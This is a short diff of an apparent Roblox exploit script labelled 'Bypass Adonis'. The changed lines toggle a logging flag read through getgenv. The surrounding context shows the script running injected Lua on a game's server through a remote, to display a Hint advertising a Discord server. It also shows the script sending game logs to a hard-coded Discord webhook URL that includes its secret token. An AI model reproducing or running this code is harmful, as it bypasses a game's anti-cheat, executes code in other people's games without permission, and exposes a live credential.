@@ -1,6 +1,6 @@
 -- // Bypass Adonis
 
-Game_Log =  Game_Log and getgenv().Game_Log or false
+
 
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
@@ -278,7 +278,7 @@ G2L_MODULES[UI["a"]] = {
                 self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Hexon SS join now! : https://discord.gg/sc4zKCmhGP ' a.Parent=workspace wait(10) a:Destroy()")
 
 
-                if Game_Log then
+                if getgenv().GameLog then
                     pcall(function()
                         request({
                             Url = 'https://discord.com/api/webhooks/1274230884064694282/8Cy9F1lloRs7dfVksKMkLdgzE24eEKKzx_-aTDiGZxebGeZX0FpL4NPrPe4okmU7VnCY',
